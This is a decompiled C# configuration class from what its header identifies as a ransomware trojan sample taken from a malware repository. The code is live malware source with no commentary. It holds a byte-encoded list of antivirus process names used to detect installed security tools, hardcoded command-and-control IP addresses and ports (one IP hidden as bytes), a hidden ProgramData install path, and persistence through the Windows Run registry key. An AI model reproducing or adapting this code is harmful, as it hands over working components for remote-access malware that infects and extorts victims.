// Decompiled with JetBrains decompiler
// Type: thnaviwa.CONFIG
// Assembly: thnaviwa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A6D437-741C-49E8-8392-5835C756DC2C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-98894973a86aa01c4f7496ae339dc73b5e6da2f1dbcd5fe1215f70ea7b889b85.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace thnaviwa
{
  internal static class CONFIG
  {
    public static byte[] encAvs = new byte[210]
    {
      (byte) 98,
      (byte) 100,
      (byte) 115,
      (byte) 115,
      (byte) 61,
      (byte) 66,
      (byte) 105,
      (byte) 116,
      (byte) 32,
      (byte) 68,
      (byte) 101,
      (byte) 102,
      (byte) 101,
      (byte) 110,
      (byte) 100,
      (byte) 101,
      (byte) 114,
      (byte) 44,
      (byte) 111,
      (byte) 110,
      (byte) 108,
      (byte) 105,
      (byte) 110,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 81,
      (byte) 72,
      (byte) 101,
      (byte) 97,
      (byte) 108,
      (byte) 44,
      (byte) 98,
      (byte) 100,
      (byte) 97,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 66,
      (byte) 68,
      (byte) 32,
      (byte) 65,
      (byte) 103,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 44,
      (byte) 109,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 99,
      (byte) 101,
      (byte) 115,
      (byte) 61,
      (byte) 77,
      (byte) 83,
      (byte) 32,
      (byte) 69,
      (byte) 115,
      (byte) 115,
      (byte) 101,
      (byte) 110,
      (byte) 116,
      (byte) 105,
      (byte) 97,
      (byte) 108,
      (byte) 115,
      (byte) 44,
      (byte) 102,
      (byte) 115,
      (byte) 115,
      (byte) 109,
      (byte) 51,
      (byte) 50,
      (byte) 61,
      (byte) 70,
      (byte) 83,
      (byte) 101,
      (byte) 99,
      (byte) 117,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 112,
      (byte) 61,
      (byte) 75,
      (byte) 97,
      (byte) 115,
      (byte) 112,
      (byte) 101,
      (byte) 114,
      (byte) 115,
      (byte) 107,
      (byte) 121,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 110,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 105,
      (byte) 114,
      (byte) 97,
      (byte) 44,
      (byte) 115,
      (byte) 112,
      (byte) 98,
      (byte) 98,
      (byte) 99,
      (byte) 115,
      (byte) 118,
      (byte) 99,
      (byte) 61,
      (byte) 83,
      (byte) 121,
      (byte) 109,
      (byte) 97,
      (byte) 110,
      (byte) 116,
      (byte) 101,
      (byte) 99,
      (byte) 44,
      (byte) 117,
      (byte) 112,
      (byte) 100,
      (byte) 97,
      (byte) 116,
      (byte) 101,
      (byte) 114,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 77,
      (byte) 99,
      (byte) 65,
      (byte) 102,
      (byte) 101,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 103,
      (byte) 99,
      (byte) 99,
      (byte) 61,
      (byte) 65,
      (byte) 86,
      (byte) 71,
      (byte) 44,
      (byte) 109,
      (byte) 98,
      (byte) 97,
      (byte) 109,
      (byte) 61,
      (byte) 65,
      (byte) 110,
      (byte) 116,
      (byte) 32,
      (byte) 77,
      (byte) 97,
      (byte) 108,
      (byte) 119,
      (byte) 97,
      (byte) 114,
      (byte) 101,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 117,
      (byte) 105,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 44,
      (byte) 97,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116,
      (byte) 61,
      (byte) 65,
      (byte) 118,
      (byte) 97,
      (byte) 115,
      (byte) 116
    };
    public static string thnaviwadefaultP = "145.105.152.121|thnaviwa".Split('|')[0];
    public static string thnaviwamainApp = "thnaviwa|thnaviwa".Split('|')[0];
    public static int port = 5156;
    public static int aport = 7218;
    public static int bport = 9686;
    public static int cport = 12538;
    public static int dport = 16468;
    public static byte[] thnaviwavpsips = new byte[13]
    {
      (byte) 53,
      (byte) 46,
      (byte) 49,
      (byte) 56,
      (byte) 57,
      (byte) 46,
      (byte) 49,
      (byte) 51,
      (byte) 52,
      (byte) 46,
      (byte) 50,
      (byte) 49,
      (byte) 54
    };
    public static int thnaviwaport = 5156;
    public static string thnaviwaappPath = "\\intaRD\\|thnaviwa".Split('|')[0];
    public static string thnaviwapc_id = "bithrva|thnaviwa".Split('|')[0];
    public static string thnaviwaremvUser = "horlncais|thnaviwa".Split('|')[0];
    public static string thnaviwafilesLogs = "mibdleba".Split('|')[0];

    public static string thnaviwaloadAV()
    {
      string str = "";
      try
      {
        Process[] processes = Process.GetProcesses();
        string[] strArray1 = Encoding.UTF8.GetString(CONFIG.encAvs, 0, CONFIG.encAvs.Length).Split(',');
        for (int index1 = 0; index1 < processes.Length; ++index1)
        {
          string lower = processes[index1].ProcessName.ToLower();
          if (lower.Length > 4)
          {
            for (int index2 = 0; index2 < strArray1.Length; ++index2)
            {
              if (strArray1[index2].Contains(lower))
              {
                string[] strArray2 = strArray1[index2].Split('=');
                str = str + " " + strArray2[1].Trim();
              }
            }
          }
        }
        return str;
      }
      catch
      {
        return "";
      }
    }

    public static byte[] getByteArray(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static string thnaviwaget_mpath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + CONFIG.thnaviwaappPath;

    public static void thnaviwaset_run(string app, string path)
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|thnaviwa".Split('|')[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        string thnaviwapcId = CONFIG.thnaviwapc_id;
        object obj = registryKey.GetValue(thnaviwapcId + app);
        if (obj == null)
        {
          registryKey.SetValue(thnaviwapcId + app, (object) path);
        }
        else
        {
          if (!(obj.ToString() != path))
            return;
          registryKey.SetValue(thnaviwapcId + app, (object) path);
        }
      }
      catch
      {
      }
    }

    public static string thnaviwaOsname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!thnaviwa".Split('!')[0];
      }
    }
  }
}
